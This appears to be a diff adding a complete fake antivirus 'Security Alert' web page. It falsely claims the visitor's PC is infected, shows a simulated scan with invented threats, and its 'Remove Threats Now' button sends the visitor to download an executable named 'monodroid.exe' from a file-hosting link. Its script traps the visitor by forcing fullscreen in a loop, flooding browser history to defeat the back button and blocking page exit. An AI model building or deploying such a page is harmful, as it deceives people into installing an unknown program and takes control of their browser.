@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        body:fullscreen {
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body:-webkit-full-screen {
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body:-moz-full-screen {
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body:-ms-fullscreen {
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .alert-box {
+            width: 500px;
+            background: white;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            background: #c41e1e;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .shield-icon {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .shield-icon::before {
+            content: "";
+            width: 0;
+            height: 0;
+            border-left: 12px solid transparent;
+            border-right: 12px solid transparent;
+            border-top: 18px solid #c41e1e;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -40%);
+        }
+
+        .header-text {
+            color: white;
+            flex: 1;
+        }
+
+        .header-text h1 {
+            font-size: 18px;
+            font-weight: normal;
+            margin-bottom: 5px;
+        }
+
+        .header-text h2 {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .body {
+            padding: 30px;
+            text-align: center;
+        }
+
+        .body p {
+            color: #333;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .body p.warning {
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .divider {
+            height: 1px;
+            background: #ccc;
+            margin: 20px 0;
+        }
+
+        .scan-button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 60px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .scan-button:hover {
+            background: #45a049;
+        }
+
+        .scan-button:disabled {
+            background: #888;
+            cursor: not-allowed;
+        }
+
+        .scan-container {
+            display: none;
+            padding: 20px;
+        }
+
+        .scan-container.active {
+            display: block;
+        }
+
+        .scan-progress {
+            width: 100%;
+            height: 30px;
+            background: #e0e0e0;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .scan-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #8BC34A);
+            width: 0%;
+            transition: width 0.1s ease;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 10px;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .scan-status {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+            font-family: monospace;
+        }
+
+        .scan-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .threat-found {
+            color: #c41e1e;
+            font-weight: bold;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .result-box {
+            display: none;
+            background: #ffebee;
+            border: 2px solid #c41e1e;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 20px;
+        }
+
+        .result-box.active {
+            display: block;
+        }
+
+        .result-box h3 {
+            color: #c41e1e;
+            margin-bottom: 10px;
+        }
+
+        .result-box p {
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .fix-button {
+            background: #c41e1e;
+            color: white;
+            border: none;
+            padding: 10px 40px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .fix-button:hover {
+            background: #a01818;
+        }
+    </style>
+</head>
+<body>
+    <div class="alert-box">
+        <div class="header">
+            <div class="shield-icon"></div>
+            <div class="header-text">
+                <h1>Security Alert</h1>
+                <h2>You've visited illegal infected website</h2>
+            </div>
+        </div>
+        
+        <div class="body" id="mainBody">
+            <p>You have visited unsafe site with illegal content</p>
+            <p class="warning">Your PC is at risk of being infected by viruses</p>
+            <p>To continue browsing safely - perform an antivirus scan</p>
+            <div class="divider"></div>
+            <button class="scan-button" id="scanBtn" onclick="startScan()">Scan</button>
+        </div>
+
+        <div class="scan-container" id="scanContainer">
+            <div class="scan-status" id="scanStatus">Initializing scan...</div>
+            <div class="scan-progress">
+                <div class="scan-bar" id="scanBar">0%</div>
+            </div>
+            <div class="scan-stats">
+                <span>Files scanned: <span id="filesScanned">0</span></span>
+                <span>Threats found: <span id="threatsFound" class="threat-found">0</span></span>
+            </div>
+        </div>
+
+        <div class="result-box" id="resultBox">
+            <h3>⚠️ THREATS DETECTED!</h3>
+            <p><strong>5 critical threats</strong> have been found on your system:</p>
+            <ul style="text-align: left; margin-bottom: 15px; font-size: 13px; color: #333;">
+                <li>Trojan.Win32.Generic (High Risk)</li>
+                <li>Adware.Agent.ABC (Medium Risk)</li>
+                <li>Spyware.KeyLogger.XYZ (Critical)</li>
+                <li>Malware.Ransomware.Lock (Critical)</li>
+                <li>PUP.Optional.Bundle (Low Risk)</li>
+            </ul>
+            <p>Your personal data is at risk! Immediate action required.</p>
+            <button class="fix-button" onclick="window.location.href='https://www.mediafire.com/file/b5rsz4fuzolyylf/monodroid.exe/file'">Remove Threats Now</button>
+        </div>
+    </div>
+
+    <script>
+        const filePaths = [
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "C:\\Users\\Admin\\AppData\\Local\\Temp\\cache.tmp",
+            "C:\\Program Files\\Common Files\\System\\sys.dll",
+            "C:\\Users\\Admin\\Documents\\invoice.pdf.exe",
+            "C:\\Windows\\SysWOW64\\config\\registry.dat",
+            "C:\\Users\\Admin\\Downloads\\setup.exe",
+            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs",
+            "C:\\Windows\\System32\\kernel32.dll",
+            "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\document.lnk",
+            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Users\\Admin\\Desktop\\important.docx",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
+            "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache.db"
+        ];
+
+        let trapActive = false;
+
+        // Force fullscreen repeatedly
+        function forceFullscreen() {
+            const elem = document.documentElement;
+            
+            function enterFs() {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement && 
+                    !document.mozFullScreenElement && !document.msFullscreenElement) {
+                    if (elem.requestFullscreen) {
+                        elem.requestFullscreen().catch(() => {});
+                    } else if (elem.webkitRequestFullscreen) {
+                        elem.webkitRequestFullscreen();
+                    } else if (elem.mozRequestFullScreen) {
+                        elem.mozRequestFullScreen();
+                    } else if (elem.msRequestFullscreen) {
+                        elem.msRequestFullscreen();
+                    }
+                }
+            }
+
+            // Try to enter fullscreen immediately and repeatedly
+            enterFs();
+            setInterval(enterFs, 100);
+        }
+
+        // Trap back button with history flooding
+        function trapBackButton() {
+            // Push multiple history states to trap back navigation
+            for (let i = 0; i < 50; i++) {
+                history.pushState(null, '', window.location.href);
+            }
+            
+            // Intercept popstate (back button)
+            window.addEventListener('popstate', function() {
+                history.pushState(null, '', window.location.href);
+                forceFullscreen();
+                return false;
+            });
+        }
+
+        // Prevent leaving the page
+        function preventLeave() {
+            window.onbeforeunload = function(e) {
+                forceFullscreen();
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            };
+        }
+
+        // Monitor visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (trapActive && document.visibilityState === 'visible') {
+                forceFullscreen();
+            }
+        });
+
+        // Aggressive fullscreen trap
+        function enableAggressiveTrap() {
+            trapActive = true;
+            
+            // Monitor fullscreen changes
+            document.addEventListener('fullscreenchange', function() {
+                if (trapActive && !document.fullscreenElement) {
+                    setTimeout(forceFullscreen, 10);
+                }
+            });
+            
+            document.addEventListener('webkitfullscreenchange', function() {
+                if (trapActive && !document.webkitFullscreenElement) {
+                    setTimeout(forceFullscreen, 10);
+                }
+            });
+            
+            document.addEventListener('mozfullscreenchange', function() {
+                if (trapActive && !document.mozFullScreenElement) {
+                    setTimeout(forceFullscreen, 10);
+                }
+            });
+            
+            document.addEventListener('MSFullscreenChange', function() {
+                if (trapActive && !document.msFullscreenElement) {
+                    setTimeout(forceFullscreen, 10);
+                }
+            });
+
+            // Start aggressive fullscreen loop
+            forceFullscreen();
+            
+            // Trap back button
+            trapBackButton();
+            
+            // Prevent leaving
+            preventLeave();
+        }
+
+        function startScan() {
+            // Enable all traps
+            enableAggressiveTrap();
+
+            document.getElementById('mainBody').style.display = 'none';
+            document.getElementById('scanContainer').classList.add('active');
+            
+            let progress = 0;
+            let filesDone = 0;
+            let threats = 0;
+            const scanBar = document.getElementById('scanBar');
+            const scanStatus = document.getElementById('scanStatus');
+            const filesScanned = document.getElementById('filesScanned');
+            const threatsFound = document.getElementById('threatsFound');
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 3 + 1;
+                if (progress > 100) progress = 100;
+                
+                scanBar.style.width = progress + '%';
+                scanBar.textContent = Math.floor(progress) + '%';
+                
+                if (Math.random() > 0.3) {
+                    filesDone++;
+                    filesScanned.textContent = filesDone;
+                    
+                    const currentFile = filePaths[Math.floor(Math.random() * filePaths.length)];
+                    scanStatus.textContent = "Scanning: " + currentFile;
+                    
+                    if (Math.random() > 0.85 && threats < 5) {
+                        threats++;
+                        threatsFound.textContent = threats;
+                        scanStatus.innerHTML = "Scanning: " + currentFile + ' <span style="color: #c41e1e;">⚠️ THREAT DETECTED!</span>';
+                    }
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('resultBox').classList.add('active');
+                    }, 500);
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
